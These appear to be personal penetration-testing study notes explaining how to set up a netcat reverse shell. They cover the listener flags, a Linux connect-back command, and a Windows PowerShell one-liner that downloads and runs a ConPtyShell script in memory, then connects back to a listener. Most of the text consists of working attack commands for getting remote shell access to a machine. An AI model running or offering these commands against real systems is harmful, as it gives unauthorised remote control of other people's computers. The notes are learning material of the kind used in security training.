- Uses the command 
	EG.
		nc

- Used for connections where the machines are on the same network.


					WORKING
					========
- When conducting reverse shell attacks we do not connect to a machine we wait for the machine to connect to us. To do this we need to create a listener to listen for a connection to our machine on a certain port that we are going to specify.
	EG.
		nc -lnvp 87  -->  nc -lnvp <port number>

			-l :- Listen mode for inbound connects.

			-n :- Numeric-only ip addresses, no dns.

			-v :- verbose. will give us all the info. 

			-p :- local port number.

*ON LINUX MACHINE.
	- On the attacked device we create a nc connection by providing the ip of the listenning machine followed by the port we are listenning to
 		EG.
 			nc 192.168.0.1 87 --> nc <ip of the listening machine> <port the listenning machine is listening to>


*ON WINDOWS MACHINE
	EG.
		IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.0.1 87
